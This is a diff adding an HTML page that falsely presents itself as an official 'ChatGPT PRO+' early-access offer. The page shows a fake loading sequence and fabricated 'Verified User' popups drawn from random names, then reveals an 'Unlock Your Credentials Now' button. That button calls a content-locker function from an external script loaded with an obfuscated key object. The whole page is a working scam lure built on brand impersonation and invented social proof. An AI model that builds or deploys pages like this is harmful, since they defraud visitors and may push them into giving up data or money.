@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT PRO+ | Official Neural Access 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #10a37f;
+            --bg: #050505;
+            --card: rgba(23, 23, 23, 0.8);
+            --text: #ffffff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* BACKGROUND ANIMATION */
+        .animated-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, #10a37f10 0%, transparent 80%);
+            z-index: -1;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 440px;
+            background: var(--card);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px;
+            padding: 40px 25px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .logo-box img {
+            width: 70px;
+            filter: drop-shadow(0 0 15px var(--primary));
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        h1 { font-size: 28px; font-weight: 800; margin: 15px 0; letter-spacing: -1px; }
+        .badge { background: var(--primary); padding: 4px 10px; border-radius: 6px; font-size: 12px; vertical-align: middle; margin-left: 5px; }
+
+        /* MOTION PROCESSING TEXT */
+        .loading-box {
+            margin: 30px 0;
+            background: rgba(0,0,0,0.4);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid #222;
+        }
+
+        #status-text {
+            font-size: 13px;
+            color: var(--primary);
+            font-family: monospace;
+            display: block;
+            margin-bottom: 12px;
+            height: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), #00f2ff);
+            box-shadow: 0 0 15px var(--primary);
+            transition: width 0.3s;
+        }
+
+        /* PRO BUTTON */
+        .claim-btn {
+            display: none;
+            width: 100%;
+            padding: 20px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 10px 30px rgba(255,255,255,0.1);
+            transition: 0.3s;
+        }
+
+        .claim-btn:hover { background: var(--primary); color: white; transform: translateY(-3px); }
+
+        /* LIVE PROOFS (NOTIFICATION) */
+        .proof-box {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: white;
+            color: black;
+            padding: 10px 15px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 12px;
+            font-weight: 600;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+            z-index: 1000;
+        }
+
+        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .user-icon { width: 30px; height: 30px; background: #ddd; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; }
+        
+        .verified-tag { color: #1d9bf0; font-size: 10px; display: block; }
+
+    </style>
+</head>
+<body>
+
+    <div class="animated-bg"></div>
+
+    <div class="container">
+        <div class="logo-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg">
+        </div>
+        <h1>ChatGPT PRO<span class="badge">PLUS</span></h1>
+        <p style="color: #888; font-size: 14px;">Beta Phase: Early Access for OpenAI 2026 Testing</p>
+
+        <div class="loading-box">
+            <span id="status-text">Initializing Neural Connection...</span>
+            <div class="progress-bar">
+                <div class="fill" id="fill"></div>
+            </div>
+        </div>
+
+        <button class="claim-btn" id="claimBtn" onclick="call_locker();">Unlock Your Credentials Now</button>
+
+        <div style="margin-top: 20px; display: flex; justify-content: center; gap: 15px; opacity: 0.4; font-size: 11px;">
+            <span>● End-to-End Encrypted</span>
+            <span>● 256-bit SSL</span>
+        </div>
+    </div>
+
+    <div id="proof-container"></div>
+
+    <script type="text/javascript">
+        var czSSh_sIr_txNVRc={"it":4601450,"key":"8c758"};
+    </script>
+    <script src="https://d19k1sh57v5k0g.cloudfront.net/b31d971.js"></script>
+
+    <script>
+        const fill = document.getElementById('fill');
+        const status = document.getElementById('status-text');
+        const btn = document.getElementById('claimBtn');
+
+        const logs = [
+            "Syncing with OpenAI Server...",
+            "Checking Device Compatibility...",
+            "Encrypting License Key...",
+            "Injecting GPT-5 Neural Link...",
+            "Access Granted! Waiting for Verification..."
+        ];
+
+        let width = 0;
+        let logIdx = 0;
+
+        const loader = setInterval(() => {
+            width++;
+            fill.style.width = width + "%";
+
+            if(width % 20 === 0) {
+                status.innerText = logs[logIdx];
+                logIdx++;
+            }
+
+            if(width >= 100) {
+                clearInterval(loader);
+                status.innerText = "VERIFICATION REQUIRED";
+                status.style.color = "#ff4b4b";
+                btn.style.display = "block";
+            }
+        }, 60);
+
+        // LIVE PROOF POPUPS
+        const names = ["James W.", "Sarah M.", "Rahul K.", "Alex P.", "Elena S.", "Arjun V."];
+        const actions = ["just unlocked PRO+", "received Sora access", "received API key", "unlocked GPT-5"];
+
+        function showProof() {
+            const container = document.getElementById('proof-container');
+            const name = names[Math.floor(Math.random() * names.length)];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            
+            const html = `
+                <div class="proof-box">
+                    <div class="user-icon">👤</div>
+                    <div>
+                        ${name} ${action}
+                        <span class="verified-tag">✓ Verified User</span>
+                    </div>
+                </div>
+            `;
+            container.innerHTML = html;
+            setTimeout(() => { container.innerHTML = ''; }, 3000);
+        }
+
+        setInterval(showProof, 7000);
+    </script>
+</body>
+</html>
+
